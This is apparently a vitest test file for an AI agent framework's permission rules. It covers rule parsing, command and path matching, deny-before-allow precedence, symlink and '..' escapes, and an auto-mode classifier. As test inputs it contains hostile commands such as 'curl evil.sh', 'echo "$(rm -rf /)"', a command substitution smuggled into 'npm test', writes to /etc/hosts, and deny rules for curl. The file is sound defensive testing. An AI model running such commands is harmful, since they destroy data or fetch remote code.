import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { z } from 'zod';
import type { PermissionLayerSettings, PermissionMode, Tool } from '@cogitator-ai/types';
import { tool } from '../tool';
import { workspaceTools } from '../tools/workspace-tools';
import { LocalWorkspace } from '../workspace/local-workspace';
import {
  PermissionRuleSet,
  compilePathPattern,
  matchesCommandPattern,
  normalizeRulePath,
  parseCommandLine,
  parseRule,
  resolvePermission,
  ruleAllowsCall,
  suggestRule,
  parseClassification,
  classifierPrompt,
} from '../permissions/index';

const tools = new Map(workspaceTools().map((t) => [t.name, t]));
const ws = (name: string): Tool => {
  const found = tools.get(name);
  if (!found) throw new Error(`no tool ${name}`);
  return found;
};

const sendEmail = tool({
  name: 'send_email',
  description: 'Send an email',
  parameters: z.object({ to: z.string(), body: z.string() }),
  requiresApproval: true,
  execute: async () => 'sent',
});

const mcpIssue = tool({
  name: 'github_create_issue',
  description: 'Create an issue',
  parameters: z.object({ title: z.string() }),
  mcp: { server: 'github', tool: 'create_issue' },
  execute: async () => 'created',
});

let base: string;
let root: string;
let workspace: LocalWorkspace;

beforeAll(async () => {
  base = realpathSync(mkdtempSync(join(tmpdir(), 'permission-rules-')));
  root = join(base, 'project');
  mkdirSync(join(root, 'src', 'lib'), { recursive: true });
  mkdirSync(join(root, 'vendor', 'pkg', 'src'), { recursive: true });
  mkdirSync(join(base, 'outside'), { recursive: true });
  writeFileSync(join(root, 'src', 'app.ts'), '');
  writeFileSync(join(base, 'outside', 'secret.txt'), '');
  symlinkSync(join(base, 'outside'), join(root, 'src', 'escape'));
  workspace = new LocalWorkspace({ root });
  await workspace.start();
});

afterAll(async () => {
  await workspace.dispose();
  rmSync(base, { recursive: true, force: true });
});

function rules(
  settings: Omit<PermissionLayerSettings, 'layer'>,
  layer: PermissionLayerSettings['layer'] = 'project'
) {
  return new PermissionRuleSet([{ layer, anchor: root, origin: `${layer}.json`, ...settings }]);
}

async function decide(
  target: Tool,
  args: Record<string, unknown>,
  settings: Omit<PermissionLayerSettings, 'layer'>,
  mode: PermissionMode = 'default',
  needsApproval = false
) {
  return resolvePermission(target, args, {
    mode,
    rules: rules(settings),
    needsApproval,
    workspace,
    projectRoot: root,
  });
}

describe('parseRule', () => {
  it.each([
    ['Bash', { tool: 'Bash' }],
    ['Bash(*)', { tool: 'Bash' }],
    ['Bash()', { tool: 'Bash' }],
    ['Bash(git push:*)', { tool: 'Bash', specifier: 'git push:*' }],
    ['Edit(./Finance (2024)/**)', { tool: 'Edit', specifier: './Finance (2024)/**' }],
    ['  mcp__github__create_issue  ', { tool: 'mcp__github__create_issue' }],
  ])('reads %s', (text, expected) => {
    expect(parseRule(text)).toMatchObject(expected);
  });

  it.each(['', 'Bash(ls', 'ls -la', '(ls)', 'Bash)'])('refuses %j', (text) => {
    expect(parseRule(text)).toHaveProperty('error');
  });
});

describe('command patterns', () => {
  it.each([
    ['npm run build', 'npm run build', true],
    ['npm run build', 'npm run build --watch', false],
    ['npm run *', 'npm run build', true],
    ['npm run *', 'npm run', true],
    ['npm run *', 'npm install', false],
    ['git log * main', 'git log --oneline main', true],
    ['git log * main', 'git log main', false],
    ['* --version', 'node --version', true],
    ['* --version', 'node -v', false],
    ['ls *', 'ls -la', true],
    ['ls *', 'ls', true],
    ['ls *', 'lsof', false],
    ['ls*', 'lsof', true],
    ['* --help *', 'npm --help x', true],
    ['* --help *', 'npm --help', false],
    ['ls:*', 'ls -la', true],
    ['ls:*', 'lsof', false],
    ['git:* push', 'git push', false],
  ])('%s against %s is %s', (pattern, command, expected) => {
    expect(matchesCommandPattern(command, pattern)).toBe(expected);
  });

  it('splits compound commands outside quotes and keeps nested ones apart', () => {
    const line = parseCommandLine(`git status && echo "a && b" | grep x; echo $(rm -rf tmp)`);
    expect(line.commands.map((command) => command.text)).toEqual([
      'git status',
      'echo "a && b"',
      'grep x',
      'echo $(rm -rf tmp)',
    ]);
    expect(line.nested.map((command) => command.text)).toEqual(['rm -rf tmp']);
    expect(line.certain).toBe(false);
  });

  it('takes wrappers and assignments off, and knows an unfinished line', () => {
    expect(parseCommandLine('timeout 30 npm test').commands[0].text).toBe('npm test');
    expect(parseCommandLine('nice -n 5 nohup npm test').commands[0].text).toBe('npm test');
    expect(parseCommandLine('xargs grep pattern').commands[0].text).toBe('grep pattern');
    expect(parseCommandLine('xargs -n1 grep pattern').commands[0].text).toBe(
      'xargs -n1 grep pattern'
    );
    const assigned = parseCommandLine('NODE_ENV=test FOO=bar npm test').commands[0];
    expect(assigned).toMatchObject({ text: 'npm test', assigned: ['NODE_ENV', 'FOO'] });
    expect(parseCommandLine('npm test &&').certain).toBe(false);
    expect(parseCommandLine('echo "open').certain).toBe(false);
    expect(parseCommandLine('npm test 2>&1').commands[0].redirectsOutput).toBe(false);
    expect(parseCommandLine('echo hi > out.txt').commands[0].redirectsOutput).toBe(true);
  });
});

describe('path patterns', () => {
  const anchors = () => ({ cwd: root, source: root, home: '/home/ann' });
  const matches = (spec: string, path: string, behavior: 'allow' | 'deny' = 'allow') => {
    const pattern = compilePathPattern(spec, behavior, anchors());
    if ('error' in pattern) throw new Error(pattern.error);
    return pattern.regex.test(path);
  };

  it.each([
    ['//etc/**', '/etc/passwd', true],
    ['~/.zshrc', '/home/ann/.zshrc', true],
    ['/src/**', () => join(root, 'src/app.ts'), true],
    ['/src/**', () => join(root, 'vendor/pkg/src/lib.js'), false],
    ['src/**', () => join(root, 'src/app.ts'), true],
    ['src/**', () => join(root, 'vendor/pkg/src/lib.js'), false],
    ['./src/*.ts', () => join(root, 'src/app.ts'), true],
    ['./src/*.ts', () => join(root, 'src/lib/deep.ts'), false],
    ['.env', () => join(root, 'a/b/.env'), true],
    ['src/**/*.ts', () => join(root, 'src/lib/deep.ts'), true],
  ])('allow %s matches %s: %s', (spec, path, expected) => {
    expect(matches(spec, typeof path === 'function' ? path() : path)).toBe(expected);
  });

  it('matches a single directory segment at any depth only in deny and ask rules', () => {
    const nested = join(root, 'vendor/pkg/src/lib.js');
    expect(matches('src/**', nested, 'allow')).toBe(false);
    expect(matches('src/**', nested, 'deny')).toBe(true);
  });

  it('refuses a backslash used as a path separator and keeps escapes', () => {
    expect(compilePathPattern('src\\app.ts', 'allow', anchors())).toHaveProperty('error');
    expect(matches('./file\\*.ts', join(root, 'file*.ts'))).toBe(true);
    expect(matches('./file\\*.ts', join(root, 'fileX.ts'))).toBe(false);
  });

  it('reads Windows paths as POSIX ones with the drive as a directory', () => {
    expect(normalizeRulePath('C:\\Users\\ann\\.env', 'win32')).toBe('/c/Users/ann/.env');
    expect(normalizeRulePath('/tmp/../etc/passwd', 'linux')).toBe('/etc/passwd');
  });
});

describe('resolvePermission', () => {
  it('maps Claude Code names onto the workspace tools', async () => {
    expect(
      (
        await decide(
          ws('run_command'),
          { command: 'git push origin main' },
          { deny: ['Bash(git push:*)'] }
        )
      ).decision
    ).toBe('deny');
    expect(
      (await decide(ws('read_file'), { path: 'src/app.ts' }, { deny: ['Read(src/**)'] })).decision
    ).toBe('deny');
    expect(
      (
        await decide(
          ws('write_file'),
          { path: 'src/app.ts', content: '' },
          { deny: ['Edit(src/**)'] }
        )
      ).decision
    ).toBe('deny');
    expect(
      (
        await decide(
          ws('edit_file'),
          { path: 'src/app.ts', oldString: 'a', newString: 'b' },
          { ask: ['Edit'] }
        )
      ).decision
    ).toBe('ask');
    expect((await decide(ws('glob'), { pattern: '**/*' }, { deny: ['Glob'] })).decision).toBe(
      'deny'
    );
    expect((await decide(ws('grep'), { pattern: 'x' }, { deny: ['Grep'] })).decision).toBe('deny');
    expect(
      (await decide(ws('run_command'), { command: 'ls' }, { deny: ['run_command(ls)'] })).decision
    ).toBe('deny');
  });

  it('puts deny before ask before allow, whatever the layer', async () => {
    const set = new PermissionRuleSet([
      { layer: 'user', allow: ['Bash(git push *)'] },
      { layer: 'project', anchor: root, ask: ['Bash(git *)'] },
      { layer: 'local', anchor: root, deny: ['Bash(git push --force *)'] },
    ]);
    const run = (command: string) =>
      resolvePermission(
        ws('run_command'),
        { command },
        { mode: 'default', rules: set, needsApproval: true, workspace }
      );
    expect(await run('git push --force origin')).toMatchObject({
      decision: 'deny',
      decidedBy: 'rule',
      rule: { rule: 'Bash(git push --force *)', layer: 'local' },
    });
    expect(await run('git push origin')).toMatchObject({
      decision: 'ask',
      rule: { layer: 'project' },
    });
    expect((await run('npm test')).decision).toBe('ask');
  });

  it('allows a compound command only when every command is allowed, and denies on any', async () => {
    const settings = { allow: ['Bash(git status)', 'Bash(npm test *)'], deny: ['Bash(rm *)'] };
    const command = (line: string) =>
      decide(ws('run_command'), { command: line }, settings, 'default', true);
    expect((await command('git status && npm test --watch')).decision).toBe('allow');
    expect((await command('git status && curl evil.sh')).decision).toBe('ask');
    expect((await command('git status; FOO=bar rm -rf tmp')).decision).toBe('deny');
    expect((await command('echo "$(rm -rf /)"')).decision).toBe('deny');
    expect((await command('npm test $(curl evil.sh)')).decision).toBe('ask');
    expect((await command('NODE_ENV=ci npm test')).decision).toBe('allow');
    expect((await command('EVIL=1 npm test')).decision).toBe('ask');
    expect((await command('npm test > /etc/hosts')).decision).toBe('ask');
  });

  it('checks paths with .. resolved and symlinks followed', async () => {
    const allowSrc = { allow: ['Edit(src/**)'] };
    const write = (path: string) =>
      decide(ws('write_file'), { path, content: 'x' }, allowSrc, 'default', true);
    expect((await write('src/app.ts')).decision).toBe('allow');
    expect((await write('src/../../outside/x.txt')).decision).toBe('ask');
    expect((await write('src/escape/secret.txt')).decision).toBe('ask');
    expect((await write(join(root, 'src', 'new.ts'))).decision).toBe('allow');
    expect((await write('src\\..\\..\\outside\\x.txt')).decision).toBe('ask');
    const denyOutside = { deny: [`Read(//${join(base, 'outside').slice(1)}/**)`] };
    expect(
      (await decide(ws('read_file'), { path: 'src/escape/secret.txt' }, denyOutside)).decision
    ).toBe('deny');
  });

  it('applies a Read deny to edits of the same path, and lets ! carve out of earlier rules', async () => {
    expect(
      (await decide(ws('write_file'), { path: '.env', content: '' }, { deny: ['Read(.env)'] }))
        .decision
    ).toBe('deny');
    const settings = { deny: ['Read(*.env)', 'Read(!sample.env)'] };
    expect((await decide(ws('read_file'), { path: 'prod.env' }, settings)).decision).toBe('deny');
    expect((await decide(ws('read_file'), { path: 'sample.env' }, settings)).decision).toBe(
      'allow'
    );
  });

  it('matches MCP tools by server and name, and parameter rules only in deny and ask', async () => {
    expect((await decide(mcpIssue, { title: 'x' }, { deny: ['mcp__github'] })).decision).toBe(
      'deny'
    );
    expect(
      (await decide(mcpIssue, { title: 'x' }, { deny: ['mcp__github__create_*'] })).decision
    ).toBe('deny');
    expect((await decide(mcpIssue, { title: 'x' }, { deny: ['mcp__*'] })).decision).toBe('deny');
    expect((await decide(mcpIssue, { title: 'x' }, { deny: ['mcp__slack'] })).decision).toBe(
      'allow'
    );
    expect(
      (await decide(mcpIssue, { title: 'x' }, { allow: ['mcp__github__*'] }, 'default', true))
        .decision
    ).toBe('allow');
    const email = { to: 'boss@example.com', body: 'hi' };
    expect(
      (await decide(sendEmail, email, { deny: ['send_email(to:*@example.com)'] })).decision
    ).toBe('deny');
    expect(
      (await decide(sendEmail, email, { allow: ['send_email(to:*@example.com)'] }, 'default', true))
        .decision
    ).toBe('ask');
    expect(rules({ allow: ['*'] }).warnings[0]).toContain('allows nothing');
  });

  it('decides by mode when no rule does', async () => {
    const edit = { path: 'src/app.ts', content: '' };
    expect(await decide(ws('write_file'), edit, {}, 'default', true)).toMatchObject({
      decision: 'ask',
      decidedBy: 'tool',
    });
    expect(await decide(ws('write_file'), edit, {}, 'acceptEdits', true)).toMatchObject({
      decision: 'allow',
      decidedBy: 'mode',
    });
    expect(
      (await decide(ws('write_file'), { path: '../x', content: '' }, {}, 'acceptEdits', true))
        .decision
    ).toBe('ask');
    expect(
      (
        await decide(
          ws('run_command'),
          { command: 'mkdir -p src/new && touch src/new/a.ts' },
          {},
          'acceptEdits',
          true
        )
      ).decision
    ).toBe('allow');
    expect(
      (await decide(ws('run_command'), { command: 'rm -rf src' }, {}, 'acceptEdits', true)).decision
    ).toBe('ask');
    expect((await decide(ws('write_file'), edit, {}, 'plan')).decision).toBe('deny');
    expect((await decide(ws('read_file'), { path: 'src/app.ts' }, {}, 'plan')).decision).toBe(
      'allow'
    );
    expect(
      (await decide(ws('write_file'), edit, { ask: ['Edit'] }, 'bypassPermissions')).decision
    ).toBe('allow');
    expect(
      (await decide(ws('write_file'), edit, { deny: ['Edit'] }, 'bypassPermissions')).decision
    ).toBe('deny');
  });

  it('asks the classifier in auto mode, and asks a person when it fails', async () => {
    const auto = (classify: () => Promise<{ decision: 'allow' | 'deny'; reason: string }>) =>
      resolvePermission(
        sendEmail,
        { to: 'a@b.c', body: '' },
        {
          mode: 'auto',
          rules: rules({}),
          needsApproval: true,
          classify,
        }
      );
    expect(await auto(async () => ({ decision: 'deny', reason: 'not asked for' }))).toMatchObject({
      decision: 'deny',
      decidedBy: 'classifier',
      reason: 'not asked for',
    });
    const failed = await auto(async () => {
      throw new Error('down');
    });
    expect(failed).toMatchObject({ decision: 'ask' });
    expect(failed.reason).toContain('down');
    const asked = await resolvePermission(
      sendEmail,
      { to: 'a', body: '' },
      {
        mode: 'auto',
        rules: rules({ ask: ['send_email'] }),
        needsApproval: true,
        classify: async () => ({ decision: 'allow', reason: 'fine' }),
      }
    );
    expect(asked.decision).toBe('ask');
  });

  it('ignores the rules of other files when managed settings say so', async () => {
    const set = new PermissionRuleSet([
      { layer: 'managed', allowManagedPermissionRulesOnly: true, deny: ['Bash(curl *)'] },
      { layer: 'project', anchor: root, allow: ['Bash'] },
    ]);
    const decision = await resolvePermission(
      ws('run_command'),
      { command: 'ls' },
      {
        mode: 'default',
        rules: set,
        needsApproval: true,
      }
    );
    expect(decision.decision).toBe('ask');
  });
});

describe('suggestRule and ruleAllowsCall', () => {
  const context = () => ({ workspace, projectRoot: root });

  it('suggests a rule in the tool name that allows the call', async () => {
    const command = { command: 'npm test -- --watch' };
    expect(suggestRule(ws('run_command'), command, context())).toBe('run_command(npm test *)');
    expect(suggestRule(ws('run_command'), { command: 'ls && pwd' }, context())).toBeUndefined();
    expect(
      suggestRule(
        ws('edit_file'),
        { path: 'src/app (1).ts', oldString: 'a', newString: 'b' },
        context()
      )
    ).toBe('edit_file(./src/app \\(1\\).ts)');
    expect(suggestRule(sendEmail, { to: 'a', body: '' }, context())).toBe('send_email');
    const suggested = suggestRule(ws('write_file'), { path: 'src/new.ts', content: '' }, context());
    expect(suggested).toBeDefined();
    expect(
      await ruleAllowsCall(
        suggested ?? '',
        ws('write_file'),
        { path: 'src/new.ts', content: '' },
        context()
      )
    ).toBe(true);
    expect(
      await ruleAllowsCall(
        suggested ?? '',
        ws('write_file'),
        { path: 'src/other.ts', content: '' },
        context()
      )
    ).toBe(false);
  });

  it('writes a path outside the working directory as an absolute rule', () => {
    const outside = join(homedir(), 'notes.md');
    expect(suggestRule(ws('read_file'), { path: outside }, context())).toBe(
      `read_file(/${normalizeRulePath(outside)})`
    );
  });
});

describe('the auto mode classifier answer', () => {
  it('reads the first JSON object, also in a fence or after words', () => {
    expect(parseClassification('```json\n{"decision":"deny","reason":"rm -rf {x}"}\n```')).toEqual({
      decision: 'deny',
      reason: 'rm -rf {x}',
    });
    expect(() => parseClassification('I think it is fine')).toThrow(/no JSON/);
    expect(() => parseClassification('{"decision":"maybe","reason":"x"}')).toThrow(/decision/);
  });

  it('shows the classifier the request, the conversation and the action', () => {
    const prompt = classifierPrompt({
      toolName: 'run_command',
      description: 'Runs commands',
      arguments: { command: 'ls' },
      request: 'list files',
      transcript: ['user: list files'],
      reason: 'run_command needs approval for this call',
    });
    expect(prompt).toContain('<user_request>\nlist files');
    expect(prompt).toContain('<recent_conversation>\nuser: list files');
    expect(prompt).toContain('"command": "ls"');
  });
});
